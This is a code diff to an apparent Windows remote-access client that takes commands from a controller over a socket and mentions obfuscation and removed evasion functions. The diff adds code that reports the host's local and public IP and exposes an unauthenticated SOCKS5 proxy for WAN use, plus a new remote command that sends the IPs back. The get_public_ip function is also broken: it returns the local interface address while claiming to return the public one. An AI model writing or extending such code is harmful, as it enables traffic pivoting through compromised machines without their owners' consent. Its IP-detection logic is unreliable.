@@ -83,6 +83,9 @@ bool socks5_handle_authentication(SOCKET client_socket);
 bool socks5_handle_connection_request(SOCKET client_socket);
 void socks5_relay_data(SOCKET client_socket, SOCKET target_socket);
 int get_available_port();
+std::string get_local_ip();
+std::string get_public_ip();
+std::string get_proxy_configuration_info(int port);
 // Removed evasion function declarations
 
 // Simple string encryption for basic obfuscation
@@ -746,6 +749,82 @@ int get_available_port() {
     return port;
 }
 
+// Get local IP address
+std::string get_local_ip() {
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
+        return "127.0.0.1";
+    }
+    
+    struct hostent* host_entry = gethostbyname(hostname);
+    if (host_entry == nullptr) {
+        return "127.0.0.1";
+    }
+    
+    struct in_addr addr;
+    addr.s_addr = *((unsigned long*)host_entry->h_addr_list[0]);
+    return std::string(inet_ntoa(addr));
+}
+
+// Get public IP address by connecting to a remote server
+std::string get_public_ip() {
+    try {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET) {
+            return "Unknown";
+        }
+        
+        // Connect to a public service to determine our public IP
+        struct sockaddr_in server_addr;
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(80);
+        server_addr.sin_addr.s_addr = inet_addr("8.8.8.8"); // Google DNS
+        
+        // Set a short timeout
+        DWORD timeout = 3000; // 3 seconds
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+        
+        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
+            struct sockaddr_in local_addr;
+            int addr_len = sizeof(local_addr);
+            if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
+                std::string public_ip = inet_ntoa(local_addr.sin_addr);
+                closesocket(sock);
+                return public_ip;
+            }
+        }
+        closesocket(sock);
+    } catch (...) {
+        // Fallback to local IP if public IP detection fails
+    }
+    
+    return get_local_ip();
+}
+
+// Get comprehensive proxy configuration information
+std::string get_proxy_configuration_info(int port) {
+    std::string local_ip = get_local_ip();
+    std::string public_ip = get_public_ip();
+    
+    std::string config = "SOCKS5 proxy started successfully on port " + std::to_string(port) + "\n\n";
+    config += "=== PROXY CONFIGURATION OPTIONS ===\n";
+    config += "LAN Access (Local Network):\n";
+    config += "  Proxy Address: " + local_ip + ":" + std::to_string(port) + "\n";
+    config += "  Use this for devices on the same network\n\n";
+    config += "WAN Access (Internet/Remote):\n";
+    config += "  Proxy Address: " + public_ip + ":" + std::to_string(port) + "\n";
+    config += "  Use this for remote access (requires port forwarding)\n\n";
+    config += "Localhost Access (Same Machine):\n";
+    config += "  Proxy Address: 127.0.0.1:" + std::to_string(port) + "\n";
+    config += "  Use this for testing on the same machine\n\n";
+    config += "Authentication: None required\n";
+    config += "Protocol: SOCKS5\n";
+    config += "Supports: IPv4 addresses and domain names";
+    
+    return config;
+}
+
 // Handle SOCKS5 authentication (we'll use no authentication for simplicity)
 bool socks5_handle_authentication(SOCKET client_socket) {
     char buffer[256];
@@ -1143,8 +1222,7 @@ std::string start_socks5_proxy(int port) {
     // Wait a moment for the server to start
     Sleep(500);
     
-    return "SOCKS5 proxy started successfully on port " + std::to_string(port) + 
-           "\nConfigure your applications to use SOCKS5 proxy: 127.0.0.1:" + std::to_string(port);
+    return get_proxy_configuration_info(port);
 }
 
 // Stop SOCKS5 proxy server
@@ -1207,9 +1285,19 @@ std::string get_proxy_status() {
     
     LeaveCriticalSection(&g_proxy_cs);
     
-    return "SOCKS5 proxy is running on port " + std::to_string(port) + 
-           "\nActive connections: " + std::to_string(active_connections) +
-           "\nProxy address: 127.0.0.1:" + std::to_string(port);
+    std::string local_ip = get_local_ip();
+    std::string public_ip = get_public_ip();
+    
+    std::string status = "SOCKS5 proxy is running on port " + std::to_string(port) + "\n";
+    status += "Active connections: " + std::to_string(active_connections) + "\n\n";
+    status += "=== AVAILABLE PROXY ADDRESSES ===\n";
+    status += "LAN Access: " + local_ip + ":" + std::to_string(port) + "\n";
+    status += "WAN Access: " + public_ip + ":" + std::to_string(port) + "\n";
+    status += "Localhost: 127.0.0.1:" + std::to_string(port) + "\n\n";
+    status += "Authentication: None required\n";
+    status += "Protocol: SOCKS5";
+    
+    return status;
 }
 
 // ============================================================================
@@ -3447,6 +3535,18 @@ int main()
                 response = get_proxy_status();
                 send(sock, response.c_str(), response.length(), 0);
                 std::cout << "SOCKS5 proxy status: " << response << std::endl;
+            }
+            else if (strcmp(buffer, "get_public_ip_info") == 0)
+            {
+                std::cout << "Getting public IP information..." << std::endl;
+                std::string local_ip = get_local_ip();
+                std::string public_ip = get_public_ip();
+                
+                response = "Public IP: " + public_ip + "\n";
+                response += "Local IP: " + local_ip;
+                
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "Public IP info sent: " << public_ip << std::endl;
             }
             else if (strcmp(buffer, "kill_client") == 0)
             {
